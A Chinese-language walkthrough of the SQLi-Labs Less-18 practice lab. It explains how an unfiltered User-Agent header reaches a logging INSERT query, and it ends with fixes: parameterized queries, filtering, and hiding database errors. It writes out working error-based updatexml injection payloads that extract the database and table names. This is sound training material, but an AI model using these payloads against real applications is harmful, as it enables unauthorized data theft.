# SQLi-Labs | Less-18 POST User-Agent头注入
## 一、漏洞简介
登录功能，登录成功之后，后端会把请求头User-Agent、客户端IP、用户名插入日志表，insert语句，User-Agent可控，存在HTTP请求头注入，使用报错注入。必须先登录成功，注入才会触发。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-18/
注入类型：POST、UA头注入、单引号闭合、insert报错注入
## 三、复现步骤
1. 正常账号密码 admin/admin 登录，抓包。
2. 在BP的请求头里找到User-Agent字段，修改UA的值，添加注入payload。
3. 发送数据包，后端执行insert写入日志，页面爆出SQL错误信息，提取数据。
## 四、Payload
User-Agent: `' and updatexml(1,concat(0x7e,database(),0x7e),1) --+`
User-Agent: `' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+`
## 五、漏洞原理
后端插入日志SQL：
`INSERT INTO uagents (uagent,ip_address,username) VALUES ('$uagent','$ip','$uname')`
User-Agent从请求头直接读取，拼接进insert语句，没有过滤，支持报错注入。
## 六、修复方案
1. 所有HTTP请求头都不可信，统一做过滤、转义。
2. 插入日志使用预编译参数绑定。
3. 关闭详细数据库错误回显。
## 七、总结
Less18属于头注入，注入点不在表单参数，在User-Agent，需要先登录成功，后端才会执行insert语句。